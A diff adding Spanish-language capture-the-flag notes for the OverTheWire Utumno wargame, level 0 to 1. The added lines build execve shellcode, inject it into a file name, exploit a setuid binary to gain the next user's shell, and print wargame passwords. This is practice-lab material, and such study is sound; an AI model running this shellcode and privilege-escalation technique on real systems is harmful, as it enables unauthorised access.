@@ -8,3 +8,21 @@ nos dio 3 dirrecciones 08048402  080484a5 08048490
 las ejecutamos printf("%s\n", 0x08048402);	printf("%s\n", 0x080484a5);	printf("%s\n", 0x08048490);
 el resultado fue 
 contraseña-. aathaeyiew
+
+LEVEL 0->1
+Ingresamos con ssh utumno1@utumno.labs.overthewire.org -p 2227
+Contraseña: aathaeyiew
+nos dio un codigo y al ejecuatarlo nos dio utumno1@utumno:/tmp/ax$ touch sh_AAAAAAAAAAAAAAAA
+creamos una shelcode y compilamis para extraer la shellcode y nos da dde resultado
+ utumno1@utumno:/tmp/ax$ nasm -f elf32 shell.asm
+utumno1@utumno:/tmp/ax$ ld -m elf_i386 -s -o shell shell.o
+utumno1@utumno:/tmp/ax$ objdump -d ./shell.o|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
+"\x31\xc0\x50\x68\x63\x6f\x64\x65\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
+utumno1@utumno:/tmp/ax$ touch sh_$(python -c "print '\x31\xc0\x50\x68\x63\x6f\x64\x65\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80'")
+utumno1@utumno:/tmp/ax$ ln -s /bin/sh /tmp/ax/code
+utumno1@utumno:/tmp/ax$ /utumno/utumno1 `pwd`
+$ whoami
+utumno2
+$ cat /etc/utumno_pass/utumno2
+ceewaceiph
+LA CONTRASEÑA HALLADA FUE ; ceewaceiph
